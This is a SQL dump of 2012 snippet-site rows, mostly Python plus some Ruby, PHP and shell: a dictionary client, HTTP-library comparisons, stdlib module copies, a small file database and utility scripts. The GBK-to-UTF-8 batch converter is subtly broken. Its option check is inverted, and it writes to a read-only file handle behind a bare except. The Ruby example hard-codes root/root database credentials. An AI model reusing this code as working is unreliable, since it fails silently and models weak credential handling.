	('492b9695964e4e4f816d52e3c9bfcb75', '0', '终端下的简单词典', 'Anonymous', 'Anonymous@talkincode.org', 'other', '#!/usr/bin/python\r\n#coding=utf8\r\nimport urllib\r\nimport sys\r\nimport re\r\nimport xml.dom.minidom as xml\r\n\r\nAPI_URL = \'http://dict.cn/ws.php?utf8=true&q=%s\'\r\n#API_URL = \'http://dict-co.iciba.com/api/dictionary.php?w=%s\'\r\ndef getword(word):\r\n    xmls = urllib.urlopen(API_URL%urllib.quote(word)).read()\r\n    root = xml.parseString(xmls).documentElement\r\n    #print re.sub(u\'>\', \'>\\n\',xmls)\r\n\r\n    tags = {\'key\':\'单词\', \'pron\':\'音标\', \'def\':\'释义\', \'sent\':\'例句\', \'orig\':\'例句\', \'trans\':\'翻译\', \'acceptation\':\'释义\'}\r\n\r\n    def isElement(node):\r\n        return node.nodeType == node.ELEMENT_NODE\r\n    def isText(node):\r\n        return node.nodeType == node.TEXT_NODE\r\n    def show(node, tagName=None):\r\n        if isText(node):\r\n            tag = tags.get(tagName, tagName)\r\n            print \'%s:%s\'%(tag, node.nodeValue)\r\n        elif isElement(node):\r\n            [show(i, node.tagName) for i in node.childNodes]\r\n\r\n    [ show(i) for i in root.childNodes if isElement(i) and i.tagName in [\'key\', \'pron\', \'def\', \'sent\', \'acceptation\'] ]\r\n    \r\ndef main():\r\n    if len(sys.argv) >= 2:\r\n        word = \' \'.join(sys.argv[1:])\r\n        getword(word)\r\n    else:\r\n        print \'usage:dict [word]\'\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    reload(sys)\r\n    sys.setdefaultencoding(\'utf8\')\r\n    main()', NULL, 'python', NULL, 22, 9, '2012-07-17 23:22:41', NULL),
	('574fb15701514f71ae0d2451e9e851b0', '0', 'urllib2,requests,httplib2代码谁最精简', 'Anonymous', 'Anonymous@talkincode.org', 'http', 'import urllib2\r\n\r\ngh_url = \'https://api.github.com\'\r\n\r\nreq = urllib2.Request(gh_url)\r\n\r\npassword_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()\r\npassword_manager.add_password(None, gh_url, \'user\', \'pass\')\r\n\r\nauth_manager = urllib2.HTTPBasicAuthHandler(password_manager)\r\nopener = urllib2.build_opener(auth_manager)\r\n\r\nurllib2.install_opener(opener)\r\n\r\nhandler = urllib2.urlopen(req)\r\n\r\nprint handler.getcode()\r\nprint handler.headers.getheader(\'content-type\')\r\n\r\n\r\n############################################################\r\n\r\n\r\nimport requests\r\n\r\nr = requests.get(\'https://api.github.com\', auth=(\'user\', \'pass\'))\r\n\r\nprint r.status_code\r\nprint r.headers[\'content-type\']\r\n\r\n\r\n############################################################\r\n\r\nimport httplib2\r\n\r\nh = httplib2.Http(".cache")\r\nh.add_credentials(\'user\', \'pass\')\r\nr, content = h.request("https://api.github.com", "GET")\r\n\r\nprint r[\'status\']\r\nprint r[\'content-type\']\r\n', NULL, 'python', NULL, 21, 6, '2012-07-17 23:34:55', NULL),
	('5c62a8222652401da8ca081d404f50d7', 'None', 'python anydbm', 'jamiesun', 'jamiesun.net@gmail.com', 'python', '"""Generic interface to all dbm clones.\n\nInstead of\n\n        import dbm\n        d = dbm.open(file, \'w\', 0666)\n\nuse\n\n        import anydbm\n        d = anydbm.open(file, \'w\')\n\nThe returned object is a dbhash, gdbm, dbm or dumbdbm object,\ndependent on the type of database being opened (determined by whichdb\nmodule) in the case of an existing dbm. If the dbm does not exist and\nthe create or new flag (\'c\' or \'n\') was specified, the dbm type will\nbe determined by the availability of the modules (tested in the above\norder).\n\nIt has the following interface (key and data are strings):\n\n        d[key] = data   # store data at key (may override data at\n                        # existing key)\n        data = d[key]   # retrieve data at key (raise KeyError if no\n                        # such key)\n        del d[key]      # delete data stored at key (raises KeyError\n                        # if no such key)\n        flag = key in d   # true if the key exists\n        list = d.keys() # return a list of all existing keys (slow!)\n\nFuture versions may change the order in which implementations are\ntested for existence, and add interfaces to other dbm-like\nimplementations.\n"""\n\'\'\'\n@description:python anydbm\n@tags:dbm,python\n\'\'\'\nclass error(Exception):\n    pass\n\n_names = [\'dbhash\', \'gdbm\', \'dbm\', \'dumbdbm\']\n_errors = [error]\n_defaultmod = None\n\nfor _name in _names:\n    try:\n        _mod = __import__(_name)\n    except ImportError:\n        continue\n    if not _defaultmod:\n        _defaultmod = _mod\n    _errors.append(_mod.error)\n\nif not _defaultmod:\n    raise ImportError, "no dbm clone found; tried %s" % _names\n\nerror = tuple(_errors)\n\ndef open(file, flag=\'r\', mode=0666):\n    """Open or create database at path given by *file*.\n\n    Optional argument *flag* can be \'r\' (default) for read-only access, \'w\'\n    for read-write access of an existing database, \'c\' for read-write access\n    to a new or existing database, and \'n\' for read-write access to a new\n    database.\n\n    Note: \'r\' and \'w\' fail if the database doesn\'t exist; \'c\' creates it\n    only if it doesn\'t exist; and \'n\' always creates a new database.\n    """\n\n    # guess the type of an existing database\n    from whichdb import whichdb\n    result=whichdb(file)\n    if result is None:\n        # db doesn\'t exist\n        if \'c\' in flag or \'n\' in flag:\n            # file doesn\'t exist and the new\n            # flag was used so use default type\n            mod = _defaultmod\n        else:\n            raise error, "need \'c\' or \'n\' flag to open new db"\n    elif result == "":\n        # db type cannot be determined\n        raise error, "db type could not be determined"\n    else:\n        mod = __import__(result)\n    return mod.open(file, flag, mode)\n', 'd07d60af92a14169afc444f5d5aeb45a', 'python', 'anydbm.py', 37, 8, '2012-07-11 00:12:56', 'sublime text 2'),
	('61a2ca01db00491686dcd32b862e6d11', '0', 'python日志logging使用', 'Anonymous', 'Anonymous@talkincode.org', 'logging', 'logger = logging.getLogger("logs")\r\nlogger.setLevel(logging.DEBUG)\r\nformatter = logging.Formatter(\'%(name)-12s %(asctime)s %(levelname)-8s %(message)s\', \'%a, %d %b %Y %H:%M:%S\',)\r\nfile_handler = logging.FileHandler("info.log")\r\nconsole_handler = logging.StreamHandler(sys.stderr)\r\nfile_handler.setFormatter(formatter)\r\nconsole_handler.setFormatter(formatter)\r\nlogger.addHandler(file_handler)\r\nlogger.addHandler(console_handler)', NULL, 'python', NULL, 10, 6, '2012-07-17 22:53:44', NULL),
	('6276599192ac484da6b5a39fb4f9cd53', 'None', 'python cmd module', 'jamiesun', 'jamiesun.net@gmail.com', 'python', '"""A generic class to build line-oriented command interpreters.\n\nInterpreters constructed with this class obey the following conventions:\n\n1. End of file on input is processed as the command \'EOF\'.\n2. A command is parsed out of each line by collecting the prefix composed\n   of characters in the identchars member.\n3. A command `foo\' is dispatched to a method \'do_foo()\'; the do_ method\n   is passed a single argument consisting of the remainder of the line.\n4. Typing an empty line repeats the last command.  (Actually, it calls the\n   method `emptyline\', which may be overridden in a subclass.)\n5. There is a predefined `help\' method.  Given an argument `topic\', it\n   calls the command `help_topic\'.  With no arguments, it lists all topics\n   with defined help_ functions, broken into up to three topics; documented\n   commands, miscellaneous help topics, and undocumented commands.\n6. The command \'?\' is a synonym for `help\'.  The command \'!\' is a synonym\n   for `shell\', if a do_shell method exists.\n7. If completion is enabled, completing commands will be done automatically,\n   and completing of commands args is done by calling complete_foo() with\n   arguments text, line, begidx, endidx.  text is string we are matching\n   against, all returned matches must begin with it.  line is the current\n   input line (lstripped), begidx and endidx are the beginning and end\n   indexes of the text being matched, which could be used to provide\n   different completion depending upon which position the argument is in.\n\nThe `default\' method may be overridden to intercept commands for which there\nis no do_ method.\n\nThe `completedefault\' method may be overridden to intercept completions for\ncommands that have no complete_ method.\n\nThe data member `self.ruler\' sets the character used to draw separator lines\nin the help messages.  If empty, no ruler line is drawn.  It defaults to "=".\n\nIf the value of `self.intro\' is nonempty when the cmdloop method is called,\nit is printed out on interpreter startup.  This value may be overridden\nvia an optional argument to the cmdloop() method.\n\nThe data members `self.doc_header\', `self.misc_header\', and\n`self.undoc_header\' set the headers used for the help function\'s\nlistings of documented functions, miscellaneous topics, and undocumented\nfunctions respectively.\n\nThese interpreters use raw_input; thus, if the readline module is loaded,\nthey automatically support Emacs-like command history and editing features.\n\n@description:python cmd module\n@tags:python,cmd\n"""\n\nimport string\n\n__all__ = ["Cmd"]\n\nPROMPT = \'(Cmd) \'\nIDENTCHARS = string.ascii_letters + string.digits + \'_\'\n\nclass Cmd:\n    """A simple framework for writing line-oriented command interpreters.\n\n    These are often useful for test harnesses, administrative tools, and\n    prototypes that will later be wrapped in a more sophisticated interface.\n\n    A Cmd instance or subclass instance is a line-oriented interpreter\n    framework.  There is no good reason to instantiate Cmd itself; rather,\n    it\'s useful as a superclass of an interpreter class you define yourself\n    in order to inherit Cmd\'s methods and encapsulate action methods.\n\n    """\n    prompt = PROMPT\n    identchars = IDENTCHARS\n    ruler = \'=\'\n    lastcmd = \'\'\n    intro = None\n    doc_leader = ""\n    doc_header = "Documented commands (type help <topic>):"\n    misc_header = "Miscellaneous help topics:"\n    undoc_header = "Undocumented commands:"\n    nohelp = "*** No help on %s"\n    use_rawinput = 1\n\n    def __init__(self, completekey=\'tab\', stdin=None, stdout=None):\n        """Instantiate a line-oriented interpreter framework.\n\n        The optional argument \'completekey\' is the readline name of a\n        completion key; it defaults to the Tab key. If completekey is\n        not None and the readline module is available, command completion\n        is done automatically. The optional arguments stdin and stdout\n        specify alternate input and output file objects; if not specified,\n        sys.stdin and sys.stdout are used.\n\n        """\n        import sys\n        if stdin is not None:\n            self.stdin = stdin\n        else:\n            self.stdin = sys.stdin\n        if stdout is not None:\n            self.stdout = stdout\n        else:\n            self.stdout = sys.stdout\n        self.cmdqueue = []\n        self.completekey = completekey\n\n    def cmdloop(self, intro=None):\n        """Repeatedly issue a prompt, accept input, parse an initial prefix\n        off the received input, and dispatch to action methods, passing them\n        the remainder of the line as argument.\n\n        """\n\n        self.preloop()\n        if self.use_rawinput and self.completekey:\n            try:\n                import readline\n                self.old_completer = readline.get_completer()\n                readline.set_completer(self.complete)\n                readline.parse_and_bind(self.completekey+": complete")\n            except ImportError:\n                pass\n        try:\n            if intro is not None:\n                self.intro = intro\n            if self.intro:\n                self.stdout.write(str(self.intro)+"\\n")\n            stop = None\n            while not stop:\n                if self.cmdqueue:\n                    line = self.cmdqueue.pop(0)\n                else:\n                    if self.use_rawinput:\n                        try:\n                            line = raw_input(self.prompt)\n                        except EOFError:\n                            line = \'EOF\'\n                    else:\n                        self.stdout.write(self.prompt)\n                        self.stdout.flush()\n                        line = self.stdin.readline()\n                        if not len(line):\n                            line = \'EOF\'\n                        else:\n                            line = line.rstrip(\'\\r\\n\')\n                line = self.precmd(line)\n                stop = self.onecmd(line)\n                stop = self.postcmd(stop, line)\n            self.postloop()\n        finally:\n            if self.use_rawinput and self.completekey:\n                try:\n                    import readline\n                    readline.set_completer(self.old_completer)\n                except ImportError:\n                    pass\n\n\n    def precmd(self, line):\n        """Hook method executed just before the command line is\n        interpreted, but after the input prompt is generated and issued.\n\n        """\n        return line\n\n    def postcmd(self, stop, line):\n        """Hook method executed just after a command dispatch is finished."""\n        return stop\n\n    def preloop(self):\n        """Hook method executed once when the cmdloop() method is called."""\n        pass\n\n    def postloop(self):\n        """Hook method executed once when the cmdloop() method is about to\n        return.\n\n        """\n        pass\n\n    def parseline(self, line):\n        """Parse the line into a command name and a string containing\n        the arguments.  Returns a tuple containing (command, args, line).\n        \'command\' and \'args\' may be None if the line couldn\'t be parsed.\n        """\n        line = line.strip()\n        if not line:\n            return None, None, line\n        elif line[0] == \'?\':\n            line = \'help \' + line[1:]\n        elif line[0] == \'!\':\n            if hasattr(self, \'do_shell\'):\n                line = \'shell \' + line[1:]\n            else:\n                return None, None, line\n        i, n = 0, len(line)\n        while i < n and line[i] in self.identchars: i = i+1\n        cmd, arg = line[:i], line[i:].strip()\n        return cmd, arg, line\n\n    def onecmd(self, line):\n        """Interpret the argument as though it had been typed in response\n        to the prompt.\n\n        This may be overridden, but should not normally need to be;\n        see the precmd() and postcmd() methods for useful execution hooks.\n        The return value is a flag indicating whether interpretation of\n        commands by the interpreter should stop.\n\n        """\n        cmd, arg, line = self.parseline(line)\n        if not line:\n            return self.emptyline()\n        if cmd is None:\n            return self.default(line)\n        self.lastcmd = line\n        if line == \'EOF\' :\n            self.lastcmd = \'\'\n        if cmd == \'\':\n            return self.default(line)\n        else:\n            try:\n                func = getattr(self, \'do_\' + cmd)\n            except AttributeError:\n                return self.default(line)\n            return func(arg)\n\n    def emptyline(self):\n        """Called when an empty line is entered in response to the prompt.\n\n        If this method is not overridden, it repeats the last nonempty\n        command entered.\n\n        """\n        if self.lastcmd:\n            return self.onecmd(self.lastcmd)\n\n    def default(self, line):\n        """Called on an input line when the command prefix is not recognized.\n\n        If this method is not overridden, it prints an error message and\n        returns.\n\n        """\n        self.stdout.write(\'*** Unknown syntax: %s\\n\'%line)\n\n    def completedefault(self, *ignored):\n        """Method called to complete an input line when no command-specific\n        complete_*() method is available.\n\n        By default, it returns an empty list.\n\n        """\n        return []\n\n    def completenames(self, text, *ignored):\n        dotext = \'do_\'+text\n        return [a[3:] for a in self.get_names() if a.startswith(dotext)]\n\n    def complete(self, text, state):\n        """Return the next possible completion for \'text\'.\n\n        If a command has not been entered, then complete against command list.\n        Otherwise try to call complete_<command> to get list of completions.\n        """\n        if state == 0:\n            import readline\n            origline = readline.get_line_buffer()\n            line = origline.lstrip()\n            stripped = len(origline) - len(line)\n            begidx = readline.get_begidx() - stripped\n            endidx = readline.get_endidx() - stripped\n            if begidx>0:\n                cmd, args, foo = self.parseline(line)\n                if cmd == \'\':\n                    compfunc = self.completedefault\n                else:\n                    try:\n                        compfunc = getattr(self, \'complete_\' + cmd)\n                    except AttributeError:\n                        compfunc = self.completedefault\n            else:\n                compfunc = self.completenames\n            self.completion_matches = compfunc(text, line, begidx, endidx)\n        try:\n            return self.completion_matches[state]\n        except IndexError:\n            return None\n\n    def get_names(self):\n        # This method used to pull in base class attributes\n        # at a time dir() didn\'t do it yet.\n        return dir(self.__class__)\n\n    def complete_help(self, *args):\n        commands = set(self.completenames(*args))\n        topics = set(a[5:] for a in self.get_names()\n                     if a.startswith(\'help_\' + args[0]))\n        return list(commands | topics)\n\n    def do_help(self, arg):\n        if arg:\n            # XXX check arg syntax\n            try:\n                func = getattr(self, \'help_\' + arg)\n            except AttributeError:\n                try:\n                    doc=getattr(self, \'do_\' + arg).__doc__\n                    if doc:\n                        self.stdout.write("%s\\n"%str(doc))\n                        return\n                except AttributeError:\n                    pass\n                self.stdout.write("%s\\n"%str(self.nohelp % (arg,)))\n                return\n            func()\n        else:\n            names = self.get_names()\n            cmds_doc = []\n            cmds_undoc = []\n            help = {}\n            for name in names:\n                if name[:5] == \'help_\':\n                    help[name[5:]]=1\n            names.sort()\n            # There can be duplicates if routines overridden\n            prevname = \'\'\n            for name in names:\n                if name[:3] == \'do_\':\n                    if name == prevname:\n                        continue\n                    prevname = name\n                    cmd=name[3:]\n                    if cmd in help:\n                        cmds_doc.append(cmd)\n                        del help[cmd]\n                    elif getattr(self, name).__doc__:\n                        cmds_doc.append(cmd)\n                    else:\n                        cmds_undoc.append(cmd)\n            self.stdout.write("%s\\n"%str(self.doc_leader))\n            self.print_topics(self.doc_header,   cmds_doc,   15,80)\n            self.print_topics(self.misc_header,  help.keys(),15,80)\n            self.print_topics(self.undoc_header, cmds_undoc, 15,80)\n\n    def print_topics(self, header, cmds, cmdlen, maxcol):\n        if cmds:\n            self.stdout.write("%s\\n"%str(header))\n            if self.ruler:\n                self.stdout.write("%s\\n"%str(self.ruler * len(header)))\n            self.columnize(cmds, maxcol-1)\n            self.stdout.write("\\n")\n\n    def columnize(self, list, displaywidth=80):\n        """Display a list of strings as a compact set of columns.\n\n        Each column is only as wide as necessary.\n        Columns are separated by two spaces (one was not legible enough).\n        """\n        if not list:\n            self.stdout.write("<empty>\\n")\n            return\n        nonstrings = [i for i in range(len(list))\n                        if not isinstance(list[i], str)]\n        if nonstrings:\n            raise TypeError, ("list[i] not a string for i in %s" %\n                              ", ".join(map(str, nonstrings)))\n        size = len(list)\n        if size == 1:\n            self.stdout.write(\'%s\\n\'%str(list[0]))\n            return\n        # Try every row count from 1 upwards\n        for nrows in range(1, len(list)):\n            ncols = (size+nrows-1) // nrows\n            colwidths = []\n            totwidth = -2\n            for col in range(ncols):\n                colwidth = 0\n                for row in range(nrows):\n                    i = row + nrows*col\n                    if i >= size:\n                        break\n                    x = list[i]\n                    colwidth = max(colwidth, len(x))\n                colwidths.append(colwidth)\n                totwidth += colwidth + 2\n                if totwidth > displaywidth:\n                    break\n            if totwidth <= displaywidth:\n                break\n        else:\n            nrows = len(list)\n            ncols = 1\n            colwidths = [0]\n        for row in range(nrows):\n            texts = []\n            for col in range(ncols):\n                i = row + nrows*col\n                if i >= size:\n                    x = ""\n                else:\n                    x = list[i]\n                texts.append(x)\n            while texts and not texts[-1]:\n                del texts[-1]\n            for col in range(len(texts)):\n                texts[col] = texts[col].ljust(colwidths[col])\n            self.stdout.write("%s\\n"%str("  ".join(texts)))\n', 'd07d60af92a14169afc444f5d5aeb45a', 'python', 'cmd.py', 23, 7, '2012-07-11 00:14:43', 'sublime text 2'),
	('6561a756aa0342ac8c1de400e58fa3d8', 'None', 'virtualenv create bootstrap script', 'piaoren', 'jamiesun@talkincode.org', 'shell,virtualenv', '#!/usr/bin/python2.7\n#encoding:utf-8\n\nimport virtualenv, textwrap\noutput = virtualenv.create_bootstrap_script(textwrap.dedent("""\ndef after_install(options, home_dir):\n    subprocess.call([join(home_dir, \'bin\', \'easy_install\'),\n                    \'dnsmd\'])             \n"""))\nprint output', '4e84ce1b8a5247bb8a6179959438b55f', 'shell', 'env.sh', 16, 5, '2012-07-27 11:47:53', 'sublime text 2'),
	('6a57cb00e9ea4c8aa5b4ee845384e4d3', '0', 'Running a ruby web client using mysql', 'Anonymous', 'Anonymous@talkincode.org', 'mysql', '#!/usr/bin/ruby\r\nrequire \'rubygems\'\r\nrequire \'socket\'\r\nrequire \'mysql2\' # gem install mysql2\r\n\r\nwebserver = TCPServer.new(\'127.0.0.1\', 6789)\r\n\r\nclient = Mysql2::Client.new(\r\n  :host => "127.0.0.1",\r\n  :username => "root",\r\n  :password => "root",\r\n  :database => "example"\r\n)\r\n\r\nrecords = client.query("SELECT * FROM users")\r\n\r\nwhile (session = webserver.accept)\r\n   session.print "HTTP/1.1 200/OK\\r\\nContent-type:text/html\\r\\n\\r\\n"\r\n   # print something on the screen\r\n   session.print "Hello, world"\r\n   request = session.gets\r\n   # print out records from the database\r\n   records.each {|r| session.print "<p>#{r[\'name\']} - #{r[\'age\']}</p>"}\r\n   session.close\r\n end', NULL, 'ruby', NULL, 12, 6, '2012-07-17 22:22:14', NULL),
	('6b67f8d1d0ea42bb84954e5d4fdc9048', 'None', 'named server service script', 'pren', '6583805@qq.com', 'shell', '#!/bin/bash \n# named a network name service. \n# chkconfig: 345 35 75 \n# description: a name server \n# @description:named server service script\n# @tags:named,shell\nif [ `id -u` -ne 0 ]\nthen\necho "ERROR:For bind to port 53,must run as root." \nexit 1\nfi\ncase "$1" in\nstart)\nif [ -x /usr/local/named/sbin/named ]; then\n/usr/local/named/sbin/named -c /usr/local/named/etc/named.conf -u bind && echo . && echo \'BIND9 server started\' \nfi\n;;\nstop)\nkill `cat /usr/local/named/named.pid` && echo . && echo \'BIND9 server stopped\' \n;;\nrestart)\necho . \necho "Restart BIND9 server" \n$0 stop\nsleep 10\n$0 start\n;;\nreload)\n/usr/local/named/sbin/rndc reload\n;;\nstatus)\n/usr/local/named/sbin/rndc status\n;;\n*)\necho "$0 start | stop | restart |reload |status" \n;;\nesac\n\n', 'c93892ebe02e4ea1a5b06cab6d1e87ab', 'shell', 'named', 34, 6, '2012-07-11 19:57:47', 'sublime text 2'),
	('6ed04bc655244514877249c5b2ed203f', '0', 'Convert CSV to JSON', 'Anonymous', 'Anonymous@talkincode.org', 'csv', '<?php\r\n/*\r\n * Converts CSV to JSON\r\n * Example uses Google Spreadsheet CSV feed\r\n * csvToArray function I think I found on php.net\r\n */\r\n\r\nheader(\'Content-type: application/json\');\r\n\r\n// Set your CSV feed\r\n$feed = \'https://docs.google.com/spreadsheet/pub?hl=en_US&hl=en_US&key=0Akse3y5kCOR8dEh6cWRYWDVlWmN0TEdfRkZ3dkkzdGc&single=true&gid=0&output=csv\';\r\n\r\n// Arrays we\'ll use later\r\n$keys = array();\r\n$newArray = array();\r\n\r\n// Function to convert CSV into associative array\r\nfunction csvToArray($file, $delimiter) { \r\n  if (($handle = fopen($file, \'r\')) !== FALSE) { \r\n    $i = 0; \r\n    while (($lineArray = fgetcsv($handle, 4000, $delimiter, \'"\')) !== FALSE) { \r\n      for ($j = 0; $j < count($lineArray); $j++) { \r\n        $arr[$i][$j] = $lineArray[$j]; \r\n      } \r\n      $i++; \r\n    } \r\n    fclose($handle); \r\n  } \r\n  return $arr; \r\n} \r\n\r\n// Do it\r\n$data = csvToArray($feed, \',\');\r\n\r\n// Set number of elements (minus 1 because we shift off the first row)\r\n$count = count($data) - 1;\r\n  \r\n//Use first row for names  \r\n$labels = array_shift($data);  \r\n\r\nforeach ($labels as $label) {\r\n  $keys[] = $label;\r\n}\r\n\r\n// Add Ids, just in case we want them later\r\n$keys[] = \'id\';\r\n\r\nfor ($i = 0; $i < $count; $i++) {\r\n  $data[$i][] = $i;\r\n}\r\n  \r\n// Bring it all together\r\nfor ($j = 0; $j < $count; $j++) {\r\n  $d = array_combine($keys, $data[$j]);\r\n  $newArray[$j] = $d;\r\n}\r\n\r\n// Print it out as JSON\r\necho json_encode($newArray);\r\n\r\n?>', NULL, 'php', NULL, 11, 8, '2012-07-17 22:18:26', NULL),
	('6ee3cdd6fc9a4b49a237000010797dc8', 'None', 'python把时间转换为`几分钟几小时前`的格式', 'piaoren', 'jamiesun@talkincode.org', 'python,datetime', 'import datetime\n\ndef convtime(ctime):\n    if not ctime:\n        return \'\'\n    cdate = datetime.datetime.strptime(ctime,\'%Y-%m-%d %H:%M:%S\')\n    nowdate = datetime.datetime.now()\n    dt = nowdate - cdate\n    secs = dt.total_seconds() \n\n    if secs < 60:\n        return u"刚刚"\n    minute = int(secs/60)\n    if minute >= 1 and minute < 60 :\n        return u"%s分钟前"%minute\n\n    hours = int(secs / (60*60))\n    if hours >= 1 and hours < 24 :\n        return u"%s小时前"%hours  \n\n    days = int(secs / (60*60*24))\n    if days >=1 and days<31:\n        return u"%s天前"%days  \n\n    months = int(secs / (60*60*24*30))\n    if months >=1 and months<12:\n        return u"%s月前"%months  \n\n    years = int(secs / (60*60*24*365))\n    return u"%s年前"%years  ', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'convtime.py', 7, 6, '2012-07-17 22:48:13', 'sublime text 2'),
	('7f1a885d38bb41fc97e1816d960f3eb6', 'None', '使用python100多行搞定一个数据库', 'piaoren', 'jamiesun@talkincode.org', 'python,database', '# -*- coding:utf-8 -*-\n# source: https://github.com/onlytiancai/wawadb\nimport os\nimport time\nimport bisect\nimport itertools\nfrom datetime import datetime\nimport logging\n\ndefault_data_dir = \'./data/\'\ndefault_write_buffer_size = 1024*10\ndefault_read_buffer_size = 1024*10\ndefault_index_interval = 1000\n\ndef ensure_data_dir():\n    if not os.path.exists(default_data_dir):\n        os.makedirs(default_data_dir)\n\ndef init():\n    ensure_data_dir()\n\nclass WawaIndex:\n    def __init__(self, index_name):\n        self.fp_index = open(os.path.join(default_data_dir, index_name + \'.index\'), \'a+\', 1)\n        self.indexes, self.offsets, self.index_count = [], [], 0\n        self.__load_index()\n\n    def __update_index(self, key, offset):\n        self.indexes.append(key)\n        self.offsets.append(offset)\n\n    def __load_index(self):\n        self.fp_index.seek(0)\n        for line in self.fp_index:\n            try:\n                key, offset  = line.split()\n                self.__update_index(key, offset)\n            except ValueError: # 索引如果没有flush的话，可能读到有半行的数据\n                pass\n\n    def append_index(self, key, offset):\n        self.index_count += 1\n        if self.index_count % default_index_interval == 0:\n            self.__update_index(key, offset)\n            self.fp_index.write(\'%s %s %s\' % (key, offset, os.linesep))\n\n    def get_offsets(self, begin_key, end_key):\n        left = bisect.bisect_left(self.indexes, str(begin_key))\n        right = bisect.bisect_left(self.indexes, str(end_key))\n        left, right = left - 1, right - 1\n        if left < 0: left = 0\n        if right < 0: right = 0\n        if right > len(self.indexes) - 1: right = len(self.indexes) - 1 \n        logging.debug(\'get_index_range:%s %s %s %s %s %s\', self.indexes[0], self.indexes[-1], begin_key, end_key, left, right)\n        return self.offsets[left], self.offsets[right] \n\n\nclass WawaDB:\n    def __init__(self, db_name):\n        self.db_name = db_name\n        self.fp_data_for_append = open(os.path.join(default_data_dir, db_name + \'.db\'), \'a\', default_write_buffer_size)\n        self.index = WawaIndex(db_name)\n\n    def __get_data_by_offsets(self, begin_key, end_key, begin_offset, end_offset):\n        fp_data = open(os.path.join(default_data_dir, self.db_name + \'.db\'), \'r\', default_read_buffer_size)\n        fp_data.seek(int(begin_offset))\n        \n        line = fp_data.readline()\n        find_real_begin_offset = False\n        will_read_len, read_len = int(end_offset) - int(begin_offset), 0\n        while line:\n            read_len += len(line)\n            if (not find_real_begin_offset) and  (line < str(begin_key)): \n                line = fp_data.readline()\n                continue\n            find_real_begin_offset = True\n            if (read_len >= will_read_len) and (line > str(end_key)): break\n            yield line.rstrip(\'\\r\\n\')\n            line = fp_data.readline()\n\n    def append_data(self, data, record_time=datetime.now()):\n        def check_args():\n            if not data:\n                raise ValueError(\'data is null\') \n            if not isinstance(data, basestring):\n                raise ValueError(\'data is not string\') \n            if data.find(\'\\r\') != -1 or data.find(\'\\n\') != -1:\n                raise ValueError(\'data contains linesep\') \n\n        check_args()\n        \n        record_time = time.mktime(record_time.timetuple()) \n        data = \'%s %s %s\' % (record_time, data, os.linesep)\n        offset = self.fp_data_for_append.tell()\n        self.fp_data_for_append.write(data)\n        self.index.append_index(record_time, offset)\n\n    def get_data(self, begin_time, end_time, data_filter=None):\n        def check_args():\n            if not (isinstance(begin_time, datetime) and isinstance(end_time, datetime)):\n                raise ValueError(\'begin_time or end_time is not datetime\') \n\n        check_args()\n\n        begin_time, end_time = time.mktime(begin_time.timetuple()), time.mktime(end_time.timetuple()) \n        begin_offset, end_offset = self.index.get_offsets(begin_time, end_time)\n\n        for data in self.__get_data_by_offsets(begin_time, end_time, begin_offset, end_offset):\n            if data_filter:\n                if data_filter(data):\n                    yield data\n            else:\n                yield data\n\ndef test():\n    from datetime import datetime, timedelta\n    import uuid, random\n    logging.getLogger().setLevel(logging.NOTSET) \n\n    def time_test(test_name):\n        def inner(f):\n            def inner2(*args, **kargs):\n                start_time = datetime.now()\n                result = f(*args, **kargs)\n                print \'%s take time:%s\' % (test_name, (datetime.now() - start_time))\n                return result\n            return inner2\n        return inner\n\n    @time_test(\'gen_test_data\')    \n    def gen_test_data(db):\n        now = datetime.now()\n        begin_time = now - timedelta(hours=5)\n        while begin_time < now:\n            print begin_time\n            for i in range(10000):\n                db.append_data(str(random.randint(1,10000))+ \' \' +str(uuid.uuid1()), begin_time)\n            begin_time += timedelta(minutes=1)\n    \n    @time_test(\'test_get_data\')    \n    def test_get_data(db):\n        begin_time = datetime.now() - timedelta(hours=3) \n        end_time = begin_time + timedelta(minutes=120)\n        results = list(db.get_data(begin_time, end_time, lambda x: x.find(\'1024\') != -1))\n        print \'test_get_data get %s results\' % len(results)\n\n    @time_test(\'get_db\')    \n    def get_db():\n        return WawaDB(\'test\')\n\n    if not os.path.exists(\'./data/test.db\'):\n        db = get_db()\n        gen_test_data(db)\n        #db.index.fp_index.flush()\n  \n    db = get_db() \n    test_get_data(db)\n\ninit()\n\nif __name__ == \'__main__\':\n    test()\n', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'wawadb.py', 20, 6, '2012-07-23 12:03:36', 'sublime text 2'),
	('8ce8e082d2024317beafa666802611ff', 'None', 'sae上运行web.py的例子', 'piaoren', 'jamiesun@talkincode.org', 'wsgi,sae', 'import os\n\nimport sae\nimport web\n        \nurls = (\n    \'/\', \'Hello\'\n)\n\napp_root = os.path.dirname(__file__)\ntemplates_root = os.path.join(app_root, \'templates\')\nrender = web.template.render(templates_root)\n\nclass Hello:        \n    def GET(self):\n        return render.hello()\n\napp = web.application(urls, globals()).wsgifunc()\n\napplication = sae.create_wsgi_app(app)\n\n\n# hello.html\n\nHello, web.py and templates', '4e84ce1b8a5247bb8a6179959438b55f', 'wsgi', 'index.wsgi', 22, 7, '2012-07-18 09:26:28', 'sublime text 2'),
	('90f1f8d21a284c0caebdacb248975cf9', 'None', '批量转换一个目录（递归）下的文件字符集到utf8', 'piaoren', 'jamiesun@talkincode.org', 'python,utf8', '#!/usr/bin/python \n#codeing:utf-8\n\nimport os\nfrom optparse import OptionParser\n\nif __name__ == "__main__":\n\n    usage = "usage: %prog [options] arg"\n    parser = OptionParser(usage)\n    parser.add_option("-p", "--path", dest="path",help="files path")\n    parser.add_option("-e", "--ext",dest="ext", help="file ext")\n    (options, args) = parser.parse_args()\n\n    cdir = options.path\n    cext = options.ext\n\n    if not cdir or cext:\n        parser.print_help()\n    else:\n        def convutf8(chdir):\n            for fd in os.listdir(chdir):\n                fpath = os.path.join(chdir,fd)\n                if os.path.isdir(fpath):\n                    print \'convutf8 dir\',fpath\n                    convutf8(fpath)\n                if fd.endswith(cext):\n                    try:\n                        with open(fpath,\'rb\') as wfd:\n                            print \'read  gbk file\',fd\n                            gbk_src = wfd.read().decode(\'gbk\')\n                            print \'write  utf8 file\',fd\n                            utf8_src = gbk_src.encode(\'utf-8\')\n                            wfd.write(utf8_src)\n                    except:\n                        print \'already gbk\'\n\n        convutf8(os.path.abspath(cdir))\n\n\n\n\n\n\n\n', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'batch2utf8.py', 43, 8, '2012-07-19 18:22:21', 'sublime text 2'),
